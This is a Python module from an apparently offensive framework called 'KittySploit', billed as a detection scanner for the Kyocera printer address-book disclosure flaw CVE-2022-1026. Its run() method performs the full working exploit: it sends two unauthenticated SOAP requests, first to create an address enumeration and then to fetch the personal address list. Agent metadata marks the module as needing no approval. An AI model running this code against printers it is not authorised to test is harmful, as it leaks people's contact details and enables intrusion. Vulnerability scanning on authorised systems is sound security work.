#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Kyocera printer address book disclosure via gSOAP (CVE-2022-1026)."""

import re
import time

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Kyocera Printer - Address Book Disclosure Detection (CVE-2022-1026)',
        'description': (
            'Kyocera printers exposing gSOAP allow unauthenticated SOAP calls to '
            '/ws/km-wsdl/setting/address_book to export the personal address book '
            '(CVE-2022-1026).'
        ),
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': [
            'web', 'scanner', 'cve', 'cve2022', 'kyocera', 'printer', 'exposure',
            'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.2,
            'noise': 0.4,
            'value': 0.8,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'admin_surface', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': ['https://nvd.nist.gov/vuln/detail/CVE-2022-1026'],
        'cve': 'CVE-2022-1026',
    }

    def run(self):
        # Quick banner gate (NASL checks Server: gSOAP/)
        probe = self.http_request(method='GET', path='/', allow_redirects=False)
        server = ''
        if probe is not None:
            server = probe.headers.get('Server') or probe.headers.get('server') or ''
        # Continue even without banner; many devices still expose the SOAP endpoint.

        path = '/ws/km-wsdl/setting/address_book'
        create = (
            '<?xml version="1.0" encoding="utf-8"?>'
            '<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://www.w3.org/2003/05/soap-envelope" '
            'xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing" '
            'xmlns:ns1="http://www.kyoceramita.com/ws/km-wsdl/setting/address_book">'
            '<SOAP-ENV:Header>'
            '<wsa:Action SOAP-ENV:mustUnderstand="true">'
            'http://www.kyoceramita.com/ws/km-wsdl/setting/address_book/create_personal_address_enumeration'
            '</wsa:Action></SOAP-ENV:Header>'
            '<SOAP-ENV:Body><ns1:create_personal_address_enumerationRequest>'
            '<ns1:number>25</ns1:number>'
            '</ns1:create_personal_address_enumerationRequest></SOAP-ENV:Body>'
            '</SOAP-ENV:Envelope>'
        )
        r1 = self.http_request(
            method='POST',
            path=path,
            data=create,
            headers={'Content-Type': 'application/soap+xml'},
            allow_redirects=False,
        )
        if not r1 or r1.status_code != 200:
            return False
        body1 = r1.text or ''
        if '<kmaddrbook:result>SUCCESS<' not in body1:
            return False
        num = re.search(r'<kmaddrbook:enumeration>([0-9]+)<', body1)
        if not num:
            return False
        time.sleep(2)
        fetch = (
            '<?xml version="1.0" encoding="utf-8"?>'
            '<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://www.w3.org/2003/05/soap-envelope" '
            'xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing" '
            'xmlns:ns1="http://www.kyoceramita.com/ws/km-wsdl/setting/address_book">'
            '<SOAP-ENV:Header>'
            '<wsa:Action SOAP-ENV:mustUnderstand="true">'
            'http://www.kyoceramita.com/ws/km-wsdl/setting/address_book/get_personal_address_list'
            '</wsa:Action></SOAP-ENV:Header>'
            '<SOAP-ENV:Body><ns1:get_personal_address_listRequest>'
            f'<ns1:enumeration>{num.group(1)}</ns1:enumeration>'
            '</ns1:get_personal_address_listRequest></SOAP-ENV:Body>'
            '</SOAP-ENV:Envelope>'
        )
        r2 = self.http_request(
            method='POST',
            path=path,
            data=fetch,
            headers={'Content-Type': 'application/soap+xml'},
            allow_redirects=False,
        )
        if not r2:
            return False
        body2 = r2.text or ''
        if '<kmaddrbook:id>' in body2 and '<kmaddrbook:address>' in body2:
            self.set_info(
                severity='medium',
                reason='Kyocera CVE-2022-1026 address book disclosure',
                path=path,
                server=server[:80],
            )
            return True
        return False
